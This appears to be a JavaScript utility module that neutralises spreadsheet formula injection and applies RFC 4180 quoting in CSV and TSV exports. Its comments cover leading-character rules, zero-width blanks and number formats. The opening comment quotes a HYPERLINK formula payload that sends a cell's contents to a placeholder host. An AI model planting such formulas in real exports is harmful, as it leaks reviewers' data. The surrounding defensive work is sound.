/**
 * The one value escaper for every spreadsheet-shaped download in HMS.
 *
 * Before this there were nine hand-written escapers. All nine handled RFC-4180
 * quoting; not one neutralised formula injection, and the data reaching them is
 * user-controlled — student names, POR position titles, disciplinary details,
 * election review comments. A student who sets a free-text field to
 * `=HYPERLINK("http://x/?"&A1,"Click")` gets it evaluated on the reviewer's
 * machine when they open the export. Quoting does not help: the spreadsheet
 * strips the quotes and evaluates what is inside.
 *
 * Two jobs, in this order — neutralise, then quote.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_LEAD = new Set(["=", "+", "-", "@", "\t", "\r"])

/**
 * Blanks an importer may skip before deciding what a cell is.
 *
 * Written as explicit alternatives rather than a character class, because a
 * class is where this goes wrong: `[ \t-X]` with a literal U+200B in the X
 * position looks like three characters and is actually the range
 * U+0020-U+200B, which matches almost everything. A guard built on that
 * silently matches the empty string and stops guarding.
 *
 * The two zero-width characters are written as escapes for the same reason
 * the range was a trap: pasted literally they are invisible in review.
 */
const LEADING_BLANKS = /^(?:\s|\u200B|\uFEFF)+/

/**
 * A value we are certain a spreadsheet should keep as a number.
 *
 * Deliberately narrow. The tempting version also exempts thousands-separated
 * and `+`-led values, and both are traps:
 *
 *   +919876543210  is a phone number, not a sum. Exempting it lets Excel read
 *                  `=+919876543210`, evaluate it, and drop the country code.
 *   -1,00,000      is what Number.toLocaleString("en-IN") produces, and this
 *                  codebase formats currency that way. A rule that accepts
 *                  three-digit groups accepts -99,999 but not -1,00,000, so
 *                  one column ends up half number and half text and SUM()
 *                  quietly omits the large rows.
 *
 * So: no separators, no plus. Anything else that starts dangerously is text.
 * That is consistent, which matters more here than preserving numeric-ness —
 * a column that is uniformly text is obvious; one that is half-and-half is not.
 */
const PLAIN_NUMBER = /^-(?:\d+(?:\.\d*)?|\.\d+)$/

/** The character a spreadsheet reads as "treat the rest as literal text". */
const GUARD = "'"

const toText = (value) => {
  if (value === null || value === undefined) return ""
  if (typeof value === "string") return value
  if (typeof value === "number" || typeof value === "boolean" || typeof value === "bigint") return String(value)
  if (value instanceof Date) return value.toISOString()
  // Anything else is a bug at the call site, and a blank cell would hide it.
  return String(value)
}

/** True when a spreadsheet would evaluate this text rather than display it. */
export const looksLikeFormula = (text) => {
  if (!text) return false
  if (FORMULA_LEAD.has(text[0])) return true
  // Some importers trim before classifying, so a leading space is not a guard.
  const trimmed = text.replace(LEADING_BLANKS, "")
  return trimmed.length > 0 && FORMULA_LEAD.has(trimmed[0])
}

/**
 * A single CSV cell: safe to open, and quoted per RFC 4180.
 *
 * `\r` is in the quote test as well as `\n`. Seven of the nine escapers this
 * replaces omitted it, so a lone CR inside a value split the row.
 */
export const escapeCsvValue = (value) => {
  const text = toText(value)
  const guarded = looksLikeFormula(text) && !PLAIN_NUMBER.test(text) ? GUARD + text : text
  return /[",\n\r]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded
}

/**
 * A single TSV cell.
 *
 * Neutralise BEFORE collapsing whitespace. The other order turns a leading tab
 * into a leading space, which is no longer in FORMULA_LEAD, so the guard never
 * fires on exactly the payload that motivated it.
 */
export const escapeTsvValue = (value) => {
  const text = toText(value)
  const guarded = looksLikeFormula(text) && !PLAIN_NUMBER.test(text) ? GUARD + text : text
  return guarded.replace(/[\t\n\r]/g, " ")
}

/**
 * Undo the guard when reading a file back in.
 *
 * HMS is an export → edit → re-upload system: the roll numbers a check
 * produces are meant to be fed into another tab's uploader. Without this the
 * guard apostrophe is parsed as part of the value and stored, and because the
 * apostrophe is not itself a formula lead a second export leaves it in place —
 * so the corruption is permanent and invisible.
 *
 * Only strips an apostrophe that is doing the guarding: the next character has
 * to be one this module would have guarded. A value that legitimately starts
 * with an apostrophe is untouched.
 */
export const unescapeCsvValue = (value) => {
  const text = toText(value)
  return text.startsWith(GUARD) && FORMULA_LEAD.has(text[1]) ? text.slice(1) : text
}

/** One CSV row, every cell escaped — header rows included. */
export const buildCsvRow = (cells = []) => cells.map(escapeCsvValue).join(",")

/** A whole CSV document from a header row and body rows. */
export const buildCsvContent = (headers = [], rows = []) =>
  [buildCsvRow(headers), ...rows.map(buildCsvRow)].join("\n")
